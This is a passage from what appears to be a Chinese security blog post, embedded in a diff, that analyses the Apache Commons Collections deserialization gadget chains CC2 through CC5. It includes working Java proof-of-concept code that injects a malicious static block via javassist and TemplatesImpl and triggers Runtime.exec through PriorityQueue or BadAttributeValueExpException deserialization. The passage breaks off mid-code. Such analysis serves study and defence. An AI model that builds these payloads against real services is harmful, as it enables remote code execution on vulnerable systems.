+跟进<code>getTransletInstance</code>:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20211107182830.png" /><br />
+再跟进<code>defineTransletClasses</code>:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20211107182941.png" /></p>
+<p>这里通过loader.defineClass将bytecodes还原为Class，接着在外面又调用了<code>_class[_transletIndex].newInstance</code>方法实例化还原的Class，所以我们可以构造一个恶意类字节码，其具有恶意的static语句块，导致任意java代码执行。也就是说，我们可以通过<code>TemplatesImpl.newTransformer</code>方法来执行恶意类的static语句块。</p>
+<p>这里我们就需要额外了解一些知识，需要了解javassit这个库，这是一个用来处理Java 字节码的类库，我们需要简单学习它的使用。</p>
+<h4 id="javassit">javassit<a class="headerlink" href="#javassit" title="Permanent link">#</a></h4>
+<h5 id="maven依赖">maven依赖<a class="headerlink" href="#maven依赖" title="Permanent link">#</a></h5>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>3.25.0-GA<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div>
+<h5 id="简单使用">简单使用<a class="headerlink" href="#简单使用" title="Permanent link">#</a></h5>
+<p>我们可以通过这个代码来实现生成java字节码:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">javassist.*</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">javassit_test</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createPseson</span><span class="p">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span>
+        <span class="n">CtClass</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&quot;Cat&quot;</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span><span class="p">;</span>
+        <span class="c1">// 创建 static 代码块，并插入代码</span>
+        <span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">randomClassName</span> <span class="o">=</span> <span class="s">&quot;EvilCat&quot;</span> <span class="o">+</span> <span class="n">System</span><span class="p">.</span><span class="na">nanoTime</span><span class="p">();</span>
+        <span class="n">cc</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="n">randomClassName</span><span class="p">);</span>
+        <span class="c1">// 生成bytes字节码，等下要用到</span>
+        <span class="c1">//byte[] classBytes = cc.toBytecode();</span>
+        <span class="c1">// 写入.class 文件</span>
+        <span class="n">cc</span><span class="p">.</span><span class="na">writeFile</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="n">createPseson</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><br />
+生成的代码大概如下:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilCat32193904579700</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="p">{</span>
+    <span class="kd">static</span> <span class="p">{</span>
+        <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;calc.exe&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="nf">EvilCat32193904579700</span><span class="p">()</span> <span class="p">{</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h4 id="poc_1">poc<a class="headerlink" href="#poc_1" title="Permanent link">#</a></h4>
+<p>了解了javassit知识之后，我们就可以构建我们最后的poc了:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassClassPath</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC2</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">TemplatesImpl</span> <span class="nf">generateEvilTemplates</span><span class="p">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span>
+        <span class="n">pool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
+        <span class="n">CtClass</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&quot;Cat&quot;</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span><span class="p">;</span>
+        <span class="c1">// 创建 static 代码块，并插入代码</span>
+        <span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">randomClassName</span> <span class="o">=</span> <span class="s">&quot;EvilCat&quot;</span> <span class="o">+</span> <span class="n">System</span><span class="p">.</span><span class="na">nanoTime</span><span class="p">();</span>
+        <span class="n">cc</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="n">randomClassName</span><span class="p">);</span>
+        <span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span>
+        <span class="c1">// 转换为bytes</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">targetByteCodes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">classBytes</span><span class="p">};</span>
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span> <span class="s">&quot;_bytecodes&quot;</span><span class="p">,</span> <span class="n">targetByteCodes</span><span class="p">);</span>
+        <span class="c1">// 进入 defineTransletClasses() 方法需要的条件</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span> <span class="s">&quot;_name&quot;</span><span class="p">,</span> <span class="s">&quot;name&quot;</span> <span class="o">+</span> <span class="n">System</span><span class="p">.</span><span class="na">nanoTime</span><span class="p">());</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span> <span class="s">&quot;_class&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span> <span class="s">&quot;_tfactory&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="p">());</span>
+
+        <span class="k">return</span> <span class="n">templates</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Transformer</span> <span class="n">transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;newTransformer&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+        <span class="n">TransformingComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="p">(</span><span class="n">transformer</span><span class="p">);</span>
+        <span class="n">PriorityQueue</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">generateEvilTemplates</span><span class="p">();</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span> <span class="s">&quot;queue&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">,</span><span class="mi">1</span><span class="p">});</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span> <span class="s">&quot;size&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span> <span class="s">&quot;comparator&quot;</span><span class="p">,</span> <span class="n">comparator</span><span class="p">);</span>
+
+        <span class="c1">//序列化和反序列化</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">)</span> <span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+    <span class="p">}</span>
+
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="p">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">obj</span><span class="p">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="p">,</span> <span class="kd">final</span> <span class="n">Object</span> <span class="n">value</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="kd">final</span> <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">(),</span> <span class="n">fieldName</span><span class="p">);</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">field</span><span class="p">);</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
+        <span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Field</span> <span class="nf">getField</span><span class="p">(</span><span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="p">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span>
+            <span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">catch</span> <span class="p">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getSuperclass</span><span class="p">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getSuperclass</span><span class="p">(),</span> <span class="n">fieldName</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="n">field</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h4 id="调用逻辑_1">调用逻辑<a class="headerlink" href="#调用逻辑_1" title="Permanent link">#</a></h4>
+<div class="highlight"><pre><span></span><code>PriorityQueue.readObject()
+  PriorityQueue.heapify()
+  PriorityQueue.siftDown()
+  PriorityQueue.siftDownUsingComparator()
+  comparator.compare() === TransformingComparator.compare()
+    InvokerTransformer.transform()
+      TemplatesImpl.newTransformer()
+        TemplatesImpl.getTransletInstance() 
+          TemplatesImpl.defineTransletClasses()  // 定义类
+        ...  // 创建类实例，触发static代码块
+</code></pre></div>
+<h2 id="cc3">CC3<a class="headerlink" href="#cc3" title="Permanent link">#</a></h2>
+<p>CC1和CC2的混合体，CC1的前段和CC2的后段，用到了一个新的类<code>TrAXFilter</code>，其构造函数会调用其属性的<code>newTransformer</code></p>
+<h4 id="调用逻辑_2">调用逻辑<a class="headerlink" href="#调用逻辑_2" title="Permanent link">#</a></h4>
+<div class="highlight"><pre><span></span><code>AnnotationInvocationHandler.readObject()
+  Proxy.entrySet() // readObject调用了proxy的某些方法，回调invoke
+    Proxy.invoke() === AnnotationInvocationHandler.invoke()
+        LazyMap.get()
+        ChainedTransformer.transform()
+          InvokerTransformer.transform()
+          InstantiateTransformer.transform()
+          newInstance()
+            TrAXFilter#TrAXFilter()
+              TemplatesImpl.newTransformer()
+                TemplatesImpl.getTransletInstance() 
+                  TemplatesImpl.defineTransletClasses()  // 定义类
+                ...  // 创建类实例，触发static代码块
+</code></pre></div>
+<h2 id="cc4">CC4<a class="headerlink" href="#cc4" title="Permanent link">#</a></h2>
+<p>基本上是CC2，只是换成了类<code>TrAXFilter</code>，其的构造函数会调用其属性的<code>newTransformer</code></p>
+<h4 id="调用逻辑_3">调用逻辑<a class="headerlink" href="#调用逻辑_3" title="Permanent link">#</a></h4>
+<div class="highlight"><pre><span></span><code>PriorityQueue.readObject()
+  PriorityQueue.heapify()
+  PriorityQueue.siftDown()
+  PriorityQueue.siftDownUsingComparator()
+  comparator.compare() === TransformingComparator.compare()
+    ChainedTransformer.transform()
+      InvokerTransformer.transform()
+      InstantiateTransformer.transform()
+      newInstance()
+        TrAXFilter#TrAXFilter()
+          TemplatesImpl.newTransformer()
+            TemplatesImpl.getTransletInstance() 
+              TemplatesImpl.defineTransletClasses()  // 定义类
+            ...  // 创建类实例，触发static代码块
+</code></pre></div>
+<h2 id="cc5">CC5<a class="headerlink" href="#cc5" title="Permanent link">#</a></h2>
+<h3 id="入口_1">入口<a class="headerlink" href="#入口_1" title="Permanent link">#</a></h3>
+<p>CC5与CC6非常相似，不同的地方是通过<code>TiedMapEntry.toString</code>方法而非<code>TiedMapEntry.hashCode</code>方法触发<code>TiedMapEntry.getValue</code>从而触发<code>LazyMap.get</code>。<br />
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TiedMapEntry</span> <span class="kd">implements</span> <span class="n">Entry</span><span class="p">,</span> <span class="n">KeyValue</span><span class="p">,</span> <span class="n">Serializable</span> <span class="p">{</span>
+    <span class="c1">//...</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="p">()</span> <span class="p">{</span>  
+     <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="na">getKey</span><span class="p">()</span> <span class="o">+</span> <span class="s">&quot;=&quot;</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span>  
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><br />
+同样的，我们需要找到一个反序列化的入口，其<code>readObject</code>会触发属性的<code>toString</code>方法，这里用到的是<code>BadAttributeValueExpException</code>这个类，其类结构大致如下:<br />
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BadAttributeValueExpException</span> <span class="kd">extends</span> <span class="n">Exception</span>   <span class="p">{</span>
+    <span class="c1">// ...</span>
+
+    <span class="kd">public</span> <span class="nf">BadAttributeValueExpException</span> <span class="p">(</span><span class="n">Object</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">val</span> <span class="o">=</span> <span class="n">val</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="kc">null</span> <span class="p">:</span> <span class="n">val</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="p">()</span>  <span class="p">{</span>
+        <span class="k">return</span> <span class="s">&quot;BadAttributeValueException: &quot;</span> <span class="o">+</span> <span class="n">val</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span> <span class="n">ois</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ClassNotFoundException</span> <span class="p">{</span>
+        <span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">GetField</span> <span class="n">gf</span> <span class="o">=</span> <span class="n">ois</span><span class="p">.</span><span class="na">readFields</span><span class="p">();</span>
+        <span class="n">Object</span> <span class="n">valObj</span> <span class="o">=</span> <span class="n">gf</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;val&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">valObj</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">String</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">val</span><span class="o">=</span> <span class="n">valObj</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">getSecurityManager</span><span class="p">()</span> <span class="o">==</span> <span class="kc">null</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Long</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Integer</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Float</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Double</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Byte</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Short</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Boolean</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="n">valObj</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// the serialized object is from a version without JDK-8019292 fix</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="na">identityHashCode</span><span class="p">(</span><span class="n">valObj</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;@&quot;</span> <span class="o">+</span> <span class="n">valObj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+ <span class="p">}</span>
+</code></pre></div><br />
+可以看到这里只要满足条件就会触发<code>valObj.toString()</code>方法，而<code>valObj</code>其实就是<code>this.val</code>，是我们可以控制的。</p>
+<h3 id="最终poc">最终poc<a class="headerlink" href="#最终poc" title="Permanent link">#</a></h3>
+<p>我们只需要对CC6链稍作修改即可，这里需要注意的是我们同样使用反射技术修改<code>BadAttributeValueExpException.val</code>，其原因也是因为如果我们通过构造函数直接设置为<code>TiedMapEntry</code>的话会造成本地命令执行:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC5</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">fakeTransformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="p">{</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">)};</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;getMethod&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;getRuntime&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;invoke&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;exec&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;calc.exe&quot;</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+        <span class="p">};</span>
+
+        <span class="c1">// 先使用fakeTransformer防止本地命令执行</span>
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">fakeTransformers</span><span class="p">);</span>
+
+        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">();</span>
+        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap</span><span class="p">,</span> <span class="n">transformerChain</span><span class="p">);</span>
+        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">outerMap</span><span class="p">,</span> <span class="s">&quot;keykey&quot;</span><span class="p">);</span>
+
+        <span class="n">BadAttributeValueExpException</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+        <span class="c1">// 使用反射替换transformerChain的transformers</span>
